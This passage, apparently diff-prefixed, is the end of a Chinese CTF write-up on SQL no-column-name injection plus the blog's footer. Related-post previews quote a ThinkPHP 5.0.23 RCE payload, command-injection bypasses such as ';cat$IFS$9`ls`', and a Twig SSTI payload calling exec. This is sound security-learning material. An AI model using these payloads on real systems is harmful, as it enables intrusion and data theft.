+<p>&emsp;<code>(select 1,2,3 as a union select*from users)</code>这里的第一个select就是给它们的列重命名，union后面就是得到一个重命名后的数据表，然后取别名为<code>x</code>。<br>&emsp;最后相当于<code>select group_concat(1,2,3) form x</code>从而把整个表里的数据回显。<br><strong>注：sql中过滤了 * 号。在无列名注入的时候 一定要和表的列数相同，不然会报错 。</strong><br><strong>改：</strong> <code>select 1,2,3 as a</code> 只会把第3列重名为 a 。这次测试中必须要给重名一个列重命名否者无法正确读取数据 – 2020/3/11（mysql 5.5.53）</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://mayi077.github.io">信安小蚂蚁</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://mayi077.github.io/2020/02/10/SWPU2019-Web1/">https://mayi077.github.io/2020/02/10/SWPU2019-Web1/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://mayi077.github.io" target="_blank">信安小蚂蚁</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/buuctf/">buuctf</a><a class="post-meta__tags" href="/tags/%E5%9F%BA%E7%A1%80%E7%A7%AF%E7%B4%AF/">基础积累</a><a class="post-meta__tags" href="/tags/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></div><div class="post-share"><div class="social-share" data-image="/images/1.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2020/02/14/SUCTF-2019-EasyWeb/" title="[SUCTF 2019]EasyWeb"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">[SUCTF 2019]EasyWeb</div></div><div class="info-2"><div class="info-item-1">0X01 涉及知识点 无数字字母shell 利用.htaccess上传文件 绕过open_basedir  0X02 无数字字母shell 打开链接，可以得到源码：1234567891011121314151617181920212223242526272829303132333435363738 &lt;?phpfunction get_the_flag()&#123;    // webadmin will remove your upload file every 20 min!!!!     $userdir = &quot;upload/tmp_&quot;.md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]);    if(!file_exists($userdir))&#123;    mkdir($userdir);    &#125;    if(!empty($_FILES[&quot;file&quot;]))&#123;        $tmp_name = $_FILES[&quot;file&quot;][&quot;tmp_n...</div></div></div></a><a class="pagination-related" href="/2020/02/10/GXYCTF2019-Ping-Ping-Ping/" title="[GXYCTF2019]Ping Ping Ping"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">[GXYCTF2019]Ping Ping Ping</div></div><div class="info-2"><div class="info-item-1">前言：这题主要考一些常用的绕过，来达到命令执行的效果。我就直接讲知识点了。 命令执行变量拼接1/?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php   内联执行将反引号内命令的输出作为输入执行 1?ip=127.0.0.1;cat$IFS$9`ls`  linux常见绕过方法 空格绕过 12345678$IFS$&#123;IFS&#125;$IFS$1 //$后面数字都行（单独数字不能为变量名）IFS linux的局部变量默认值是空格、制表符和换行符&lt; &lt;&gt; %20 %09   一些命令分隔符 123linux中：%0a 、%0d 、; 、&amp; 、| 、&amp;&amp;、||windows中：%0a、&amp;、|、%1a（一个神奇的角色，作为.bat文件中的命令分隔符） 花括号的别样用法 12在Linux bash中还可以使用&#123;OS_COMMAND,ARGUMENT&#125;来执行系统命令&#123;cat,flag&#125;  黑名单绕过技巧 1234567891011121314151617181920212...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2020/03/29/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-200329/" title="刷题记录 200329"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2020-03-29</div><div class="info-item-2">刷题记录 200329</div></div><div class="info-2"><div class="info-item-1">前言：&emsp;BUUCTF 又蹦出许多一分题，加油搞完一分题就休息。 [BJDCTF 2nd]old-hack&emsp;这题主要考ThinkPHP的漏洞，实在水平有限没看具体的原由直接搜漏洞试 payload 。被自己再次菜哭。  看到页面又THINKPHP5，我们传入get参数s随便赋值，就可以看到报错信息。是ThinkPHP 5.0.23版本。 到网上找到了许多 payload 试了一下这个可行：123psot: _method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=ls /POST：_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=cat /flagGET：?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat /flag ...</div></div></div></a><a class="pagination-related" href="/2020/01/18/web-admin/" title="web-admin"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2020-01-18</div><div class="info-item-2">web-admin</div></div><div class="info-2"><div class="info-item-1">前言：&emsp;看别人的wp发现这题主要有3种方法但因现在的我能力有限只能搞懂一种方法——Unicode欺骗。那么接下来我将总结此种方法，以及解题思路。   一、解题思路 打开题目链接，发现可以注册可以登入。经过一系列判断过后，我开始尝试随便创一个用户。登入后发现，可以改密码和提交意见，随后在查看改密码的那个页面的源码有一个注释如：&emsp;下载后观察发现：     打开代码后发现古怪，自定义函数： 1234def strlower(username):    username = nodeprep.prepare(username)    return username    // 看字面意思是将字符串中的大写转小写，但是python自带了lower函数所以古怪，经过查找资料发现Unicode欺骗漏洞   然后我们发现在使用nodeprep.prepare函数转换时过程如下： 1ᴬ-&gt; A -&gt; a  而从上面的代码可知，在创建的时候会进行一次nodeprep.prepare(username)赋值username，在改密码时又会进行一次nodeprep.pre...</div></div></div></a><a class="pagination-related" href="/2020/01/24/SUCTF-2019-CheckIn/" title="[SUCTF 2019]CheckIn"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2020-01-24</div><div class="info-item-2">[SUCTF 2019]CheckIn</div></div><div class="info-2"><div class="info-item-1">前言：&emsp;这题主要考的是.user.ini和绕过exif_imagetype判断，下面且由我细细道来！ 0X01 关于 .user.ini 的知识点&emsp;.user.ini的理解&emsp;我们可以在.user.ini中设置php.ini中PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置，而且只要是在使用 CGI／FastCGI 模式的服务器上都可以使用.user.ini（他是动态的，不需要重启服务器，根据时间自动更新）。其中  auto_append_file : 指定一个文件 , 自动包含在要执行的文件末尾 , 类似与在可执行文件末尾调用了 require() 函数 auto_prepend_file : 指定一个文件 , 自动包含在要执行的文件开头 , 类似与在可执行文件开头调用了 require() 函数  &emsp;这就类似于文件包含漏洞了 , 要知道PHP文件包含是不需要考虑文件的后缀名的 . 被包含文件中的php代码会被执行 , 非php代码会被输出。 &emsp;利用.user.ini漏洞的条件 服务器脚本语言为PH...</div></div></div></a><a class="pagination-related" href="/2020/03/23/BJDCTF2020-Cookie-is-so-stable/" title="[BJDCTF2020]Cookie is so stable"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2020-03-23</div><div class="info-item-2">[BJDCTF2020]Cookie is so stable</div></div><div class="info-2"><div class="info-item-1">前言：&emsp; 这题主要是考 ssti 模板注入。通过这题我学习到了如何判定它使用的是何种 模板引擎，以及重温了很久以前用过的ssti利用工具【tplmap】,记录一下别又忘记了。 解题过程 发现 flag选项，进入后发现输入username后有回显hello username 。猜想是 ssti 注入漏洞，输入4 返回了4。但是当我们进一步执行时，会被检测到报错。 看题目说是cookie 而且 hint 下也有提示 cookie。bp抓包发现注入点 user。 判断其模板引擎类型方法如图：其中红线是执行失败所对应的下一步测试方式。 我们输入{{7*'7'}} 发现返回 49,那么它应该是Twig模板引擎。 知道了模板引擎是 Twig 后，我们搜搜它的利用payload为：1&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125; 最后我们使用的pay...</div></div></div></a><a class="pagination-related" href="/2020/01/31/RoarCTF-2019-Easy-Java/" title="[RoarCTF 2019]Easy Java"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2020-01-31</div><div class="info-item-2">[RoarCTF 2019]Easy Java</div></div><div class="info-2"><div class="info-item-1">前言：&emsp;第一次遇到java类的题目，本应该是翻阅java相关资料，而我直接去看了别人的wp，也不知道这样做对不对。还有就是写wp确实很费时间呀！ 0X01 解题思路 打开是一个登入界面，看了别人的wp爆破出admin的密码也得不到flag。接着我尝试点击help，弹出一个错误，提示了help.docx , 接着我尝试直接访可以得到一个文件，但是flag不在文件里，文件里也没有其它提示。 因为上面会返回一个报错信息，我们打开brup截取请求信息，根据别人的经验将请求方式改为post将请求的文件改为WEB-INF/web.xml因为这里主要也是考这个文件的泄漏。  3. 然后参考下面资料   4. 我们构造filename=WEB-INF/classes/com/wm/ctf/FlagController.class    5. 最后解码得到flag，大功告成！！   &emsp; 0X02 WEB-INF/web.xml泄露&emsp;WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能...</div></div></div></a><a class="pagination-related" href="/2020/02/14/SUCTF-2019-EasyWeb/" title="[SUCTF 2019]EasyWeb"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2020-02-14</div><div class="info-item-2">[SUCTF 2019]EasyWeb</div></div><div class="info-2"><div class="info-item-1">0X01 涉及知识点 无数字字母shell 利用.htaccess上传文件 绕过open_basedir  0X02 无数字字母shell 打开链接，可以得到源码：1234567891011121314151617181920212223242526272829303132333435363738 &lt;?phpfunction get_the_flag()&#123;    // webadmin will remove your upload file every 20 min!!!!     $userdir = &quot;upload/tmp_&quot;.md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]);    if(!file_exists($userdir))&#123;    mkdir($userdir);    &#125;    if(!empty($_FILES[&quot;file&quot;]))&#123;        $tmp_name = $_FILES[&quot;file&quot;][&quot;tmp_n...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/images/1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">信安小蚂蚁</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">135</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">86</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/mayi077"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">2020–2021，这里记录了 100+ 篇文字。
+后来因工作入职，暂时搁笔。
+2026，重新起航。
+继续写下去。
+</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">前言：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8mysql-innodb-table-stats%E6%8A%A5%E8%A1%A8%E5%90%8D"><span class="toc-number">2.</span> <span class="toc-text">用mysql.innodb_table_stats报表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text">无列名注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8B%E9%9D%A2%E5%86%8D%E6%9D%A5%E5%88%86%E6%9E%90%E4%BB%A5%E4%B8%8B%E6%AD%A4%E9%A2%98%E7%9A%84payload"><span class="toc-number">4.</span> <span class="toc-text">下面再来分析以下此题的payload</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/04/20/2026-04-20-TLS%E5%8A%A0%E5%AF%86%E5%A5%97%E4%BB%B6/" title="TLS加密套件">TLS加密套件</a><time datetime="2026-04-20T14:30:00.000Z" title="发表于 2026-04-20 22:30:00">2026-04-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/04/20/2026-04-20-AI-Agent-%E6%9E%B6%E6%9E%84/" title="AI Agent 架构">AI Agent 架构</a><time datetime="2026-04-19T16:00:00.000Z" title="发表于 2026-04-20 00:00:00">2026-04-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2021/04/15/PHP-%E6%AD%A3%E5%88%99%E7%9A%84-m%E5%A4%9A%E8%A1%8C%E6%A8%A1%E5%BC%8F/" title="PHP 正则的 m多行模式">PHP 正则的 m多行模式</a><time datetime="2021-04-15T00:54:31.000Z" title="发表于 2021-04-15 08:54:31">2021-04-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2021/04/14/vulnstack-ATT-CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97-%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/" title="vulnstack-ATT&amp;CK实战系列 红队实战（一）">vulnstack-ATT&amp;CK实战系列 红队实战（一）</a><time datetime="2021-04-14T12:46:10.000Z" title="发表于 2021-04-14 20:46:10">2021-04-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2021/04/09/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" title="域内横向移动">域内横向移动</a><time datetime="2021-04-09T07:56:53.000Z" title="发表于 2021-04-09 15:56:53">2021-04-09</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By 信安小蚂蚁</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 5.4.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.5-b1</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.5-b1"></script><script src="/js/main.js?v=5.5.5-b1"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
